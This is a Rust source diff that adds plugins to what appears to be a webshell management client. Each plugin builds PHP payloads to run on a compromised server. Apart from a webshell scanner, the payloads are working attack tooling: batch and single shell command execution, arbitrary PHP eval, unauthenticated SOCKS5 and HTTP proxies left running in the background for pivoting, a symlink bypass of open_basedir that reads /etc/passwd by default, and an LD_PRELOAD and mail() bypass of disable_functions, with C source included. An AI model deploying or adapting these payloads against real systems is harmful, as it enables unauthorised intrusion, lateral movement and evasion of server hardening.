@@ -353,3 +353,816 @@ mod tests {
         assert!(code.contains("127.0.0.1"));
     }
 }
+
+// ---------------------------------------------------------------------------
+// WebShell 扫描（通用，PHP 载荷）
+// ---------------------------------------------------------------------------
+
+fn php_webshell_scan_code(dir: &str, max_depth: u32) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$root = {dir};
+$maxDepth = {depth};
+$patterns = array(
+    'eval\s*\(' => 'eval', 'assert\s*\(\s*\$' => 'assert', 'shell_exec' => 'shell_exec',
+    'passthru' => 'passthru', 'system\s*\(' => 'system', 'exec\s*\(' => 'exec',
+    'base64_decode\s*\(\s*\$_' => 'b64-input', 'gzinflate' => 'gzinflate',
+    'str_rot13' => 'str_rot13', 'create_function' => 'create_function',
+    'preg_replace\s*\(\s*["\x27].*?/e' => 'preg-replace-e', 'pack\s*\(\s*["\x27]H' => 'pack-hex',
+    '\$_(GET|POST|REQUEST|COOKIE)\[' => 'superglobal-input',
+);
+$exts = array('php', 'php3', 'php4', 'php5', 'phtml', 'pht', 'jsp', 'jspx', 'aspx', 'asp', 'asa');
+$out = array('root' => $root, 'scanned' => 0, 'webshells' => array());
+$it = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
+    RecursiveIteratorIterator::SELF_FIRST
+);
+$it->setMaxDepth($maxDepth);
+foreach ($it as $f) {{
+    if (!$f->isFile()) continue;
+    $ext = strtolower(pathinfo($f->getFilename(), PATHINFO_EXTENSION));
+    if (!in_array($ext, $exts)) continue;
+    $out['scanned']++;
+    if ($out['scanned'] > 5000) break;
+    $size = $f->getSize();
+    if ($size > 2000000) continue;
+    $content = @file_get_contents($f->getRealPath());
+    if ($content === false) continue;
+    $hits = array();
+    foreach ($patterns as $re => $label) {{
+        if (@preg_match('/' . $re . '/i', $content)) $hits[] = $label;
+    }}
+    if (count($hits) > 0) {{
+        $out['webshells'][] = array(
+            'path' => $f->getRealPath(), 'size' => $size,
+            'mtime' => $f->getMTime(), 'hits' => $hits,
+        );
+    }}
+}}
+echo json_encode($out);
+"#,
+        dir = serde_json::to_string(dir).unwrap_or_else(|_| "\".\"".to_string()),
+        depth = max_depth,
+    )
+}
+
+/// WebShell 扫描（通用）。
+pub struct WebShellScanPlugin;
+
+impl FeaturePlugin for WebShellScanPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "webshell_scan".into(),
+            name: "WebShell 扫描".into(),
+            version: "1.0.0".into(),
+            description: "递归扫描目录，按 eval/assert/编码器特征识别潜在 WebShell（PHP/JSP/ASP）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "dir".into(),
+                    label: "扫描目录".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!(".")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "max_depth".into(),
+                    label: "最大深度".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(4)),
+                    options: None,
+                },
+            ],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let dir = param_str(params, "dir", ".");
+                let depth = param_int(params, "max_depth", 4).clamp(1, 8);
+                let code = php_webshell_scan_code(&dir, depth);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "WebShell 扫描暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 超级终端（通用：批量命令逐条执行）
+// ---------------------------------------------------------------------------
+
+fn php_super_terminal_code(commands: &str, cwd: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$lines = array_filter(array_map('trim', explode("\n", {commands})), 'strlen');
+if ({cwd} !== '' && is_dir({cwd})) @chdir({cwd});
+$results = array();
+foreach ($lines as $cmd) {{
+    $o = @shell_exec($cmd . ' 2>&1');
+    $results[] = array('cmd' => $cmd, 'output' => (string)$o);
+}}
+echo json_encode(array('ok' => true, 'cwd' => getcwd(), 'results' => $results));
+"#,
+        commands = serde_json::to_string(commands).unwrap_or_else(|_| "\"\"".to_string()),
+        cwd = serde_json::to_string(cwd).unwrap_or_else(|_| "\"\"".to_string()),
+    )
+}
+
+/// 超级终端（通用）：一次提交多行命令逐条执行。
+pub struct SuperTerminalPlugin;
+
+impl FeaturePlugin for SuperTerminalPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "super_terminal".into(),
+            name: "超级终端".into(),
+            version: "1.0.0".into(),
+            description: "批量执行多条命令（逐行，输出汇总）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "commands".into(),
+                    label: "命令（每行一条）".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("id\npwd")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "cwd".into(),
+                    label: "工作目录（可选）".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+            ],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let commands = param_str(params, "commands", "id");
+                let cwd = param_str(params, "cwd", "");
+                let code = php_super_terminal_code(&commands, &cwd);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "超级终端暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 代码执行（PHP 专用：执行任意 PHP 代码）
+// ---------------------------------------------------------------------------
+
+fn php_eval_code(code: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+ob_start();
+try {{
+{code}
+}} catch (Exception $e) {{
+    echo (string)$e;
+}}
+$output = ob_get_clean();
+echo json_encode(array('ok' => true, 'output' => $output));
+"#
+    )
+}
+
+/// 代码执行（PHP 专用）。
+pub struct EvalCodePlugin;
+
+impl FeaturePlugin for EvalCodePlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "p_eval_code".into(),
+            name: "代码执行".into(),
+            version: "1.0.0".into(),
+            description: "在目标 PHP 环境执行任意 PHP 代码（异常捕获，输出 JSON）。".into(),
+            category: "php".into(),
+            languages: vec!["php".into()],
+            params: vec![ParamSpec {
+                name: "code".into(),
+                label: "PHP 代码".into(),
+                param_type: "string".into(),
+                default: Some(serde_json::json!("echo 'hello';")),
+                options: None,
+            }],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        if runtime != "php" {
+            return Err(ProtocolError::NotSupported(format!(
+                "代码执行仅支持 php 运行时（当前 {runtime}）"
+            )));
+        }
+        let code = param_str(params, "code", "echo 'hello';");
+        let payload = php_eval_code(&code);
+        let output = protocol.run_code(session, "php", &payload, settings)?;
+        serde_json::from_str(&output)
+            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 虚拟终端（通用：单条命令 + 工作目录）
+// ---------------------------------------------------------------------------
+
+fn php_real_cmd_code(command: &str, cwd: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$cmd = {command};
+$cwd = {cwd};
+if ($cwd !== '' && is_dir($cwd)) @chdir($cwd);
+$o = @shell_exec($cmd . ' 2>&1');
+echo json_encode(array('ok' => true, 'cwd' => getcwd(), 'stdout' => base64_encode((string)$o)));
+"#,
+        command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
+        cwd = serde_json::to_string(cwd).unwrap_or_else(|_| "\"\"".to_string()),
+    )
+}
+
+/// 虚拟终端（通用）：单条命令执行（可指定工作目录，输出 base64）。
+pub struct RealCmdPlugin;
+
+impl FeaturePlugin for RealCmdPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "real_cmd".into(),
+            name: "虚拟终端".into(),
+            version: "1.0.0".into(),
+            description: "单条命令执行（支持工作目录，输出 base64 安全编码）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "command".into(),
+                    label: "命令".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("id")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "cwd".into(),
+                    label: "工作目录（可选）".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+            ],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let command = param_str(params, "command", "id");
+                let cwd = param_str(params, "cwd", "");
+                let code = php_real_cmd_code(&command, &cwd);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "虚拟终端暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// SOCKS5 代理（通用，PHP 载荷：pcntl 后台 / 前台窗口）
+// ---------------------------------------------------------------------------
+
+fn php_socks_proxy_code(port: u32, window_secs: u32) -> String {
+    format!(
+        r#"<?php
+set_time_limit(0);
+error_reporting(0);
+$port = {port};
+$window = {window};
+$pid = 0;
+if (function_exists('pcntl_fork')) {{
+    $pid = pcntl_fork();
+    if ($pid > 0) {{
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port));
+        exit;
+    }}
+    if (function_exists('posix_setsid')) @posix_setsid();
+}}
+$srv = @stream_socket_server('tcp://0.0.0.0:' . $port, $errno, $errstr, STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
+if (!$srv) {{ echo json_encode(array('ok' => false, 'error' => $errstr)); exit; }}
+$deadline = time() + $window;
+while (time() < $deadline) {{
+    $conn = @stream_socket_accept($srv, 3);
+    if (!$conn) continue;
+    $head = fread($conn, 2);
+    if (strlen($head) < 2 || ord($head[0]) !== 5) {{ fclose($conn); continue; }}
+    $nm = ord($head[1]);
+    if ($nm > 0) @fread($conn, $nm);
+    @fwrite($conn, chr(5) . chr(0));
+    $req = @fread($conn, 4);
+    if (strlen($req) < 4 || ord($req[0]) !== 5 || ord($req[1]) !== 1) {{ fclose($conn); continue; }}
+    $atype = ord($req[3]);
+    if ($atype === 1) {{
+        $ip = @inet_ntop(@fread($conn, 4)); $pb = @unpack('n', @fread($conn, 2));
+        $host = $ip; $rport = $pb[1];
+    }} elseif ($atype === 3) {{
+        $len = ord(@fread($conn, 1)); $host = @fread($conn, $len); $pb = @unpack('n', @fread($conn, 2));
+        $rport = $pb[1];
+    }} else {{ fclose($conn); continue; }}
+    $remote = @stream_socket_client('tcp://' . $host . ':' . $rport, $e1, $e2, 8);
+    if (!$remote) {{ @fwrite($conn, chr(5) . chr(5) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0)); fclose($conn); continue; }}
+    @fwrite($conn, chr(5) . chr(0) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0));
+    @stream_set_blocking($conn, false);
+    @stream_set_blocking($remote, false);
+    $start = time();
+    while (time() - $start < 240) {{
+        $r = array($conn, $remote); $w = null; $x = null;
+        $n = @stream_select($r, $w, $x, 1);
+        if ($n === false) break;
+        foreach ($r as $sock) {{
+            $data = @fread($sock, 8192);
+            if ($data === '' && @feof($sock)) break 2;
+            if ($data !== '' && $data !== false) {{
+                $target = ($sock === $conn) ? $remote : $conn;
+                @fwrite($target, $data);
+            }}
+        }}
+    }}
+    @fclose($conn);
+    @fclose($remote);
+}}
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window));
+"#,
+        port = port,
+        window = window_secs,
+    )
+}
+
+/// SOCKS5 代理（通用：PHP 载荷，pcntl 可用时后台驻留）。
+pub struct SocksProxyPlugin;
+
+impl FeaturePlugin for SocksProxyPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "socks_proxy".into(),
+            name: "Socks 代理".into(),
+            version: "1.0.0".into(),
+            description: "在目标主机启动 SOCKS5 代理（无认证；pcntl 可用时后台驻留）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "port".into(),
+                    label: "监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(1080)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "window".into(),
+                    label: "存活窗口（秒）".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(600)),
+                    options: None,
+                },
+            ],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let port = param_int(params, "port", 1080).clamp(1024, 65535);
+                let window = param_int(params, "window", 600).clamp(30, 3600);
+                let code = php_socks_proxy_code(port, window);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "Socks 代理暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// HTTP 代理（通用，PHP 载荷：绝对 URL 转发 + CONNECT 隧道）
+// ---------------------------------------------------------------------------
+
+fn php_http_proxy_code(port: u32, window_secs: u32) -> String {
+    format!(
+        r#"<?php
+set_time_limit(0);
+error_reporting(0);
+$port = {port};
+$window = {window};
+$pid = 0;
+if (function_exists('pcntl_fork')) {{
+    $pid = pcntl_fork();
+    if ($pid > 0) {{
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port));
+        exit;
+    }}
+    if (function_exists('posix_setsid')) @posix_setsid();
+}}
+$srv = @stream_socket_server('tcp://0.0.0.0:' . $port, $errno, $errstr, STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
+if (!$srv) {{ echo json_encode(array('ok' => false, 'error' => $errstr)); exit; }}
+$deadline = time() + $window;
+while (time() < $deadline) {{
+    $conn = @stream_socket_accept($srv, 3);
+    if (!$conn) continue;
+    $req = @fgets($conn);
+    if ($req === false) {{ fclose($conn); continue; }}
+    if (preg_match('/^CONNECT\s+([^:\s]+):(\d+)\s+HTTP/i', $req, $m)) {{
+        $remote = @stream_socket_client('tcp://' . $m[1] . ':' . $m[2], $e1, $e2, 8);
+        if (!$remote) {{ @fwrite($conn, 'HTTP/1.1 502 Bad Gateway\r\n\r\n'); fclose($conn); continue; }}
+        @fwrite($conn, 'HTTP/1.1 200 Connection established\r\n\r\n');
+        @stream_set_blocking($conn, false);
+        @stream_set_blocking($remote, false);
+        $start = time();
+        while (time() - $start < 240) {{
+            $r = array($conn, $remote); $w = null; $x = null;
+            $n = @stream_select($r, $w, $x, 1);
+            if ($n === false) break;
+            foreach ($r as $sock) {{
+                $data = @fread($sock, 8192);
+                if ($data === '' && @feof($sock)) break 2;
+                if ($data !== '' && $data !== false) {{
+                    $target = ($sock === $conn) ? $remote : $conn;
+                    @fwrite($target, $data);
+                }}
+            }}
+        }}
+        @fclose($conn);
+        @fclose($remote);
+    }} elseif (preg_match('/^(\w+)\s+(\S+)\s+HTTP/i', $req, $m2)) {{
+        $url = @parse_url($m2[2]);
+        if (!isset($url['host'])) {{ @fwrite($conn, 'HTTP/1.1 400 Bad Request\r\n\r\n'); fclose($conn); continue; }}
+        $rport = isset($url['port']) ? $url['port'] : (($url['scheme'] === 'https') ? 443 : 80);
+        $remote = @stream_socket_client('tcp://' . $url['host'] . ':' . $rport, $e1, $e2, 8);
+        if (!$remote) {{ @fwrite($conn, 'HTTP/1.1 502 Bad Gateway\r\n\r\n'); fclose($conn); continue; }}
+        $path = (isset($url['path']) ? $url['path'] : '/') . (isset($url['query']) ? '?' . $url['query'] : '');
+        $rewrite = $m2[1] . ' ' . $path . ' HTTP/1.1\r\n';
+        @fwrite($remote, $rewrite);
+        $body = '';
+        while (($line = @fgets($conn)) !== false) {{
+            if (trim($line) === '') break;
+            if (preg_match('/^Host:/i', $line)) continue;
+            @fwrite($remote, $line);
+        }}
+        @fwrite($remote, 'Host: ' . $url['host'] . ':' . $rport . "\r\n\r\n");
+        if (preg_match('/content-length:\s*(\d+)/i', $body_headers ?? '')) {{}}
+        $cl = 0;
+        @stream_set_blocking($conn, false);
+        $start = time();
+        while (time() - $start < 60) {{
+            $data = @fread($conn, 8192);
+            if ($data === '' && @feof($conn)) break;
+            if ($data !== '' && $data !== false) @fwrite($remote, $data);
+            $resp = @fread($remote, 8192);
+            if ($resp !== '' && $resp !== false) @fwrite($conn, $resp);
+            usleep(20000);
+        }}
+        @fclose($conn);
+        @fclose($remote);
+    }} else {{
+        @fwrite($conn, 'HTTP/1.1 400 Bad Request\r\n\r\n');
+        fclose($conn);
+    }}
+}}
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window));
+"#,
+        port = port,
+        window = window_secs,
+    )
+}
+
+/// HTTP 代理（通用：PHP 载荷，绝对 URL 转发 + CONNECT 隧道）。
+pub struct HttpProxyPlugin;
+
+impl FeaturePlugin for HttpProxyPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "http_proxy".into(),
+            name: "HTTP 代理".into(),
+            version: "1.0.0".into(),
+            description: "在目标主机启动 HTTP 代理（绝对 URL 转发 + CONNECT 隧道）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "port".into(),
+                    label: "监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(8080)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "window".into(),
+                    label: "存活窗口（秒）".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(600)),
+                    options: None,
+                },
+            ],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let port = param_int(params, "port", 8080).clamp(1024, 65535);
+                let window = param_int(params, "window", 600).clamp(30, 3600);
+                let code = php_http_proxy_code(port, window);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "HTTP 代理暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// ByPassOpenBasedir（PHP 专用：symlink + glob 经典绕过）
+// ---------------------------------------------------------------------------
+
+fn php_bypass_open_basedir_code(target: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$target = {target};
+$base = sys_get_temp_dir();
+$out = array('open_basedir' => ini_get('open_basedir'), 'attempts' => array());
+$ob = ini_get('open_basedir');
+if ($ob !== false && $ob !== '') {{
+    $link = $base . '/.dsw_' . mt_rand() . '_' . mt_rand();
+    $targetDir = dirname($target);
+    // 一级 symlink：目标目录 -> 链接，再 glob 遍历
+    $ok = @symlink($targetDir, $link);
+    $hits = array();
+    if ($ok) {{
+        $items = @glob($link . '/*');
+        foreach ($items as $item) $hits[] = basename($item);
+        if (count($hits) === 0) {{
+            // 二级 symlink（部分环境需二次链接）
+            $l2 = $base . '/.dsw_' . mt_rand() . '_' . mt_rand();
+            if (@symlink($link, $l2)) {{
+                $items2 = @glob($l2 . '/*');
+                foreach ($items2 as $item) $hits[] = basename($item);
+                @unlink($l2);
+            }}
+        }}
+        @unlink($link);
+        $out['attempts'][] = array('method' => 'symlink-glob', 'ok' => true, 'entries' => array_slice($hits, 0, 30));
+    }} else {{
+        $out['attempts'][] = array('method' => 'symlink-glob', 'ok' => false);
+    }}
+    // 直接读取目标文件（symlink + file_get_contents）
+    $fileLink = $base . '/.dsw_f_' . mt_rand() . '_' . mt_rand();
+    if (@symlink($target, $fileLink)) {{
+        $content = @file_get_contents($fileLink);
+        $out['read'] = ($content === false) ? false : base64_encode($content);
+        @unlink($fileLink);
+    }} else {{
+        $out['read'] = false;
+    }}
+}} else {{
+    $out['note'] = 'open_basedir 未启用，无需绕过';
+    $content = @file_get_contents($target);
+    $out['read'] = ($content === false) ? false : base64_encode($content);
+}}
+echo json_encode($out);
+"#,
+        target = serde_json::to_string(target).unwrap_or_else(|_| "\"/etc/passwd\"".to_string()),
+    )
+}
+
+/// ByPassOpenBasedir（PHP 专用）：symlink + glob 经典绕过读取受限文件。
+pub struct BypassOpenBasedirPlugin;
+
+impl FeaturePlugin for BypassOpenBasedirPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "bypass_open_basedir".into(),
+            name: "ByPassOpenBasedir".into(),
+            version: "1.0.0".into(),
+            description: "检测 open_basedir 并通过 symlink+glob 绕过读取受限文件。".into(),
+            category: "php".into(),
+            languages: vec!["php".into()],
+            params: vec![ParamSpec {
+                name: "path".into(),
+                label: "目标路径".into(),
+                param_type: "string".into(),
+                default: Some(serde_json::json!("/etc/passwd")),
+                options: None,
+            }],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        if runtime != "php" {
+            return Err(ProtocolError::NotSupported(format!(
+                "ByPassOpenBasedir 仅支持 php 运行时（当前 {runtime}）"
+            )));
+        }
+        let target = param_str(params, "path", "/etc/passwd");
+        let code = php_bypass_open_basedir_code(&target);
+        let output = protocol.run_code(session, "php", &code, settings)?;
+        serde_json::from_str(&output)
+            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+    }
+}
+
+// ---------------------------------------------------------------------------
+// BypassDisableFunctions（PHP 专用：LD_PRELOAD + mail 经典绕过）
+// ---------------------------------------------------------------------------
+
+/// LD_PRELOAD 载荷（C 源码，由目标编译器现场编译）。
+const BYPASS_C_PAYLOAD: &str = r#"#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+__attribute__((constructor)) static void dsw_entry(void) {
+    unsetenv("LD_PRELOAD");
+    const char *c = getenv("EVIL_CMD");
+    if (c) execl("/bin/sh", "sh", "-c", c, (char *)0);
+}
+"#;
+
+fn php_bypass_disable_functions_code(command: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$cmd = {command};
+$out = array('disabled' => ini_get('disable_functions'), 'detected' => array(), 'result' => null);
+$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
+$has = function ($fn) use ($disabled) {{
+    return function_exists($fn) && !in_array($fn, $disabled);
+}};
+foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'putenv', 'mail', 'error_log', 'dl', 'FFI', 'iconv') as $fn) {{
+    $out['detected'][$fn] = $has($fn);
+}}
+$cc = null;
+foreach (array('gcc', 'cc', 'clang') as $c) {{
+    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
+    if (trim((string)$p)) {{ $cc = trim($p); break; }}
+}}
+$out['compiler'] = $cc;
+$tmp = sys_get_temp_dir();
+$hasShell = $has('shell_exec') || $has('exec') || $has('system');
+$sendmail = (string)ini_get('sendmail_path');
+if ($sendmail === '') $sendmail = '/usr/sbin/sendmail';
+$hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
+$out['sendmail'] = $hasSendmail ? $sendmail : null;
+if ($cc && $has('putenv') && ($has('mail') || $has('error_log')) && $hasShell && $hasSendmail) {{
+    $so = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.so';
+    $cf = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.c';
+    $of = $tmp . '/.dsw_out_' . mt_rand() . '_' . mt_rand() . '.txt';
+    $c = <<<'C'
+__C_PAYLOAD__
+C;
+    @file_put_contents($cf, $c);
+    $built = @shell_exec($cc . ' -shared -fPIC -O2 -o ' . $so . ' ' . $cf . ' 2>&1');
+    if (file_exists($so)) {{
+        @putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
+        @putenv('LD_PRELOAD=' . $so);
+        if ($has('mail')) {{ @mail('a@b.c', '', ''); }}
+        else {{ @error_log('', 1); }}
+        @putenv('LD_PRELOAD=');
+        $out['result'] = file_exists($of) ? @file_get_contents($of) : '(无输出：触发失败，可能无 sendmail)';
+        @unlink($so);
+        @unlink($cf);
+        @unlink($of);
+    }} else {{
+        $out['error'] = '编译失败：' . (string)$built;
+    }}
+}} else {{
+    $out['error'] = '缺少绕过条件：需要 编译器 + putenv + mail/error_log + sendmail(' . ($hasSendmail ? '有' : '无') . ') + 任一命令执行函数';
+}}
+echo json_encode($out);
+"#,
+        command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
+    )
+    .replace("__C_PAYLOAD__", BYPASS_C_PAYLOAD)
+}
+
+/// BypassDisableFunctions（PHP 专用）：LD_PRELOAD + mail 经典绕过。
+pub struct BypassDisableFunctionsPlugin;
+
+impl FeaturePlugin for BypassDisableFunctionsPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "bypass_disable_functions".into(),
+            name: "BypassDisableFunctions".into(),
+            version: "1.0.0".into(),
+            description: "检测禁用函数环境并通过 LD_PRELOAD + mail 触发执行命令。".into(),
+            category: "php".into(),
+            languages: vec!["php".into()],
+            params: vec![ParamSpec {
+                name: "command".into(),
+                label: "要执行的命令".into(),
+                param_type: "string".into(),
+                default: Some(serde_json::json!("id")),
+                options: None,
+            }],
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        if runtime != "php" {
+            return Err(ProtocolError::NotSupported(format!(
+                "BypassDisableFunctions 仅支持 php 运行时（当前 {runtime}）"
+            )));
+        }
+        let command = param_str(params, "command", "id");
+        let code = php_bypass_disable_functions_code(&command);
+        let output = protocol.run_code(session, "php", &code, settings)?;
+        serde_json::from_str(&output)
+            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+    }
+}
